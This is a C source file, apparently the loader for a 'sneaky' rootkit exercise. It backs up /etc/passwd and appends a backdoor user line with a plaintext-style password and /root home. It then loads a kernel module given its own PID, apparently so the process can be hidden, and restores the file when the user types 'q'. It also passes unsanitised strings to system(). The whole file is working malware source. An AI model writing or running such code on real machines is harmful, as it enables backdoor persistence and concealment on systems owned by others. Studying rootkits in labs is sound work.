#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/wait.h>

void copy_file(const char* source, const char* destination) {
    // Use system() to execute cp command
    char command[256];
    snprintf(command, sizeof(command), "cp %s %s", source, destination);
    system(command);
}

int main() {
    pid_t pid = getpid();
    
    // Step 1: Print process ID
    printf("sneaky_process pid = %d\n", pid);
    
    // Step 2: Copy /etc/passwd to /tmp/passwd and modify the original
    copy_file("/etc/passwd", "/tmp/passwd");
    
    // Append the sneaky user line to /etc/passwd
    FILE* passwd_file = fopen("/etc/passwd", "a");
    if (passwd_file) {
        fprintf(passwd_file, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
        fclose(passwd_file);
    } else {
        printf("Failed to open /etc/passwd for writing\n");
        return 1;
    }
    
    // Step 3: Load the sneaky module and pass the PID
    char insmod_command[100];
    snprintf(insmod_command, sizeof(insmod_command), "insmod sneaky_mod.ko sneaky_pid=%d", pid);
    system(insmod_command);
    
    // Step 4: Wait for 'q' to be pressed
    printf("Module loaded. Enter 'q' to quit.\n");
    char c;
    while ((c = getchar()) != 'q');
    
    // Step 5: Unload the module
    system("rmmod sneaky_mod");
    
    // Step 6: Restore the original /etc/passwd
    copy_file("/tmp/passwd", "/etc/passwd");
    
    return 0;
}